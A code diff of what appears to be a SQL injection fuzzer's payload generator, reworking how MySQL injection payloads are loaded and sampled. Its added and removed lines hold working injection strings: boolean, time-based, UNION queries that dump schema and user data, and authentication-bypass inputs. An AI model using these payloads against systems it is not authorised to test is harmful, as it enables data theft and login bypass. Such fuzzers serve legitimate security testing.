@@ -2,6 +2,8 @@
 """
 Payload Generator module for the SQL Injection Fuzzer
 """
+import random
+from modules.payloads import PAYLOADS
 
 
 class PayloadGenerator:
@@ -10,76 +12,51 @@ class PayloadGenerator:
         self.boolean_based_payloads = []
         self.time_based_payloads = []
         self.union_based_payloads = []
-        self.authentication_bypass_payloads = []
 
-        self._init_payloads()
+        # Initialize payloads from the payloads.py file
+        self._load_payloads_from_file()
 
-    def _init_payloads(self):
-        """Initialize the payload lists with common SQL injection payloads"""
+        # Also keep some classic union-based payloads
+        self._init_union_payloads()
 
-        # Error-based payloads (MySQL specific)
-        self.error_based_payloads = [
-            "'",
-            "\"",
-            "`",
-            "'))",
-            "';",
-            "\"",
-            "\" OR \"\"=\"",
-            "' OR ''='",
-            "' OR 1=1 -- ",
-            "\" OR 1=1 -- ",
-            "' OR '1'='1",
-            "' OR 1 -- ",
-            "' OR 1/*",
-            "\" OR \"1\"=\"1",
-            "\" OR 1 -- ",
-            "\" OR 1/*",
-            "or 1=1",
-            "or 1=1--",
-            "or 1=1#",
-            "or 1=1/*",
-            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
-            "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--"
-        ]
+    def _load_payloads_from_file(self):
+        """Load payloads from the payloads.py file"""
+        # Process boolean-based payloads
+        for payload_obj in PAYLOADS.get("MySQL", {}).get("boolean-based", []):
+            base_payload = payload_obj.get("payload", "")
+            comments = payload_obj.get("comments", [])
 
-        # Boolean-based payloads
-        self.boolean_based_payloads = [
-            "' AND 1=1 -- ",
-            "' AND 1=0 -- ",
-            "' OR 1=1 -- ",
-            "' OR 1=0 -- ",
-            "' AND '1'='1",
-            "' AND '1'='0",
-            "' OR '1'='1",
-            "' OR '1'='0",
-            "1' AND 1=1 -- ",
-            "1' AND 1=0 -- ",
-            "1' OR 1=1 -- ",
-            "1' OR 1=0 -- ",
-            "1 AND 1=1 -- ",
-            "1 AND 1=0 -- ",
-            "1 OR 1=1 -- ",
-            "1 OR 1=0 -- "
-        ]
+            for comment in comments:
+                pref = comment.get("pref", "")
+                suf = comment.get("suf", "")
+                full_payload = f"{pref}{base_payload}{suf}"
+                self.boolean_based_payloads.append(full_payload)
 
-        # Time-based payloads (MySQL specific)
-        self.time_based_payloads = [
-            "' AND SLEEP(5) -- ",
-            "\" AND SLEEP(5) -- ",
-            "' OR SLEEP(5) -- ",
-            "\" OR SLEEP(5) -- ",
-            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "'; WAITFOR DELAY '0:0:5' -- ",
-            "\"; WAITFOR DELAY '0:0:5' -- ",
-            "' OR BENCHMARK(10000000,MD5(1)) -- ",
-            "\" OR BENCHMARK(10000000,MD5(1)) -- "
-        ]
+        # Process time-based payloads
+        for payload_obj in PAYLOADS.get("MySQL", {}).get("time-based", []):
+            base_payload = payload_obj.get(
+                "payload", "").replace("[SLEEPTIME]", "5")
+            comments = payload_obj.get("comments", [])
 
-        # Union-based payloads (MySQL specific)
+            for comment in comments:
+                pref = comment.get("pref", "")
+                suf = comment.get("suf", "")
+                full_payload = f"{pref}{base_payload}{suf}"
+                self.time_based_payloads.append(full_payload)
+
+        # Process error-based payloads
+        for payload_obj in PAYLOADS.get("MySQL", {}).get("error-based", []):
+            base_payload = payload_obj.get("payload", "")
+            comments = payload_obj.get("comments", [])
+
+            for comment in comments:
+                pref = comment.get("pref", "")
+                suf = comment.get("suf", "")
+                full_payload = f"{pref}{base_payload}{suf}"
+                self.error_based_payloads.append(full_payload)
+
+    def _init_union_payloads(self):
+        """Initialize union-based payloads"""
         self.union_based_payloads = [
             "' UNION SELECT NULL -- ",
             "' UNION SELECT NULL,NULL -- ",
@@ -87,36 +64,17 @@ class PayloadGenerator:
             "' UNION SELECT NULL,NULL,NULL,NULL -- ",
             "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
             "' UNION SELECT @@version -- ",
-            "' UNION SELECT @@version,NULL -- ",
-            "' UNION SELECT @@version,NULL,NULL -- ",
-            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ",
             "' UNION SELECT user(),database() -- ",
             "' UNION SELECT table_name,column_name FROM information_schema.columns -- ",
-            "' UNION SELECT table_schema,table_name FROM information_schema.tables -- "
+            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- "
         ]
 
-        # Authentication bypass payloads
-        # self.authentication_bypass_payloads = [
-        #     "admin' -- ",
-        #     "admin' #",
-        #     "admin'/*",
-        #     "' OR 1=1 -- ",
-        #     "' OR 1=1 #",
-        #     "' OR 1=1/*",
-        #     "admin' OR '1'='1",
-        #     "admin' OR '1'='1' -- ",
-        #     "admin' OR '1'='1' #",
-        #     "admin'OR 1=1 OR ''='",
-        #     "admin' OR 1=1",
-        #     "admin' OR 1=1--",
-        #     "admin' OR 1=1#",
-        #     "admin' OR 1=1/*",
-        #     "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
-        # ]
-
-    def generate_mysql_payloads(self):
+    def generate_mysql_payloads(self, max_payloads=None):
         """
         Generate a list of MySQL-specific SQL injection payloads
+
+        Args:
+            max_payloads (int, optional): Maximum number of payloads to return
 
         Returns:
             list: A list of SQL injection payloads
@@ -128,13 +86,34 @@ class PayloadGenerator:
         all_payloads.extend(self.boolean_based_payloads)
         all_payloads.extend(self.time_based_payloads)
         all_payloads.extend(self.union_based_payloads)
-        # all_payloads.extend(self.authentication_bypass_payloads)
 
         # Remove duplicates while preserving order
         unique_payloads = []
         for payload in all_payloads:
             if payload not in unique_payloads:
                 unique_payloads.append(payload)
+
+        # Limit the number of payloads if specified
+        if max_payloads and max_payloads < len(unique_payloads):
+            # Ensure we have a good mix of different payload types
+            error_count = min(max_payloads // 4,
+                              len(self.error_based_payloads))
+            boolean_count = min(max_payloads // 4,
+                                len(self.boolean_based_payloads))
+            time_count = min(max_payloads // 4, len(self.time_based_payloads))
+            union_count = max_payloads - error_count - boolean_count - time_count
+
+            selected_payloads = []
+            selected_payloads.extend(random.sample(
+                self.error_based_payloads, error_count))
+            selected_payloads.extend(random.sample(
+                self.boolean_based_payloads, boolean_count))
+            selected_payloads.extend(random.sample(
+                self.time_based_payloads, time_count))
+            selected_payloads.extend(random.sample(self.union_based_payloads, min(
+                union_count, len(self.union_based_payloads))))
+
+            return selected_payloads
 
         return unique_payloads
 
@@ -166,13 +145,16 @@ class PayloadGenerator:
         return self.boolean_based_payloads
 
     def generate_time_based_payloads(self):
-        """Get time-based payloads"""
-        return self.time_based_payloads
+        """
+        Get time-based payloads with default sleep time
+
+        Returns:
+            list: Time-based payloads
+        """
+        # Use fixed sleep time of 3 seconds for time-based payloads
+        sleep_time = 3
+        return [p.replace("[SLEEPTIME]", str(sleep_time)) for p in self.time_based_payloads]
 
     def generate_union_based_payloads(self):
         """Get union-based payloads"""
         return self.union_based_payloads
-
-    def generate_authentication_bypass_payloads(self):
-        """Get authentication bypass payloads"""
-        return self.authentication_bypass_payloads
